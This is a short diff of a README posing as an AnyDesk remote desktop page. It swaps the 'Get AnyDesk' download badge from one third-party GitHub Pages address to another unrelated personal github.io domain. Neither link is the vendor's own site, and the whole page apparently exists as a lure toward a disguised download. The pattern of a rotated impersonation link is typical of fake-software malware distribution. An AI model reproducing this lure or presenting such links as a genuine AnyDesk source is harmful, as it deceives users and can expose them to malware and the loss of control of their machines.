@@ -1,11 +1,8 @@
 # AnyDesk — remote desktop & support software (EN)
 
 
-<p align="center">
-  <a href="https://anydesk-remote-desktop.github.io/.github">
-    <img src="https://img.shields.io/badge/Get_AnyDesk-1b2838?style=for-the-badge&logo=windows&logoColor=white" alt="Get AnyDesk">
-  </a>
-</p>
+[![GET AnyDesk remote](https://img.shields.io/badge/GET%20%E2%80%94%20AnyDesk-remote-0078D6?style=for-the-badge&logoColor=white)](https://similawojtanikfr.github.io/.github/AnyDesk-remote)
+
 
 ---
 
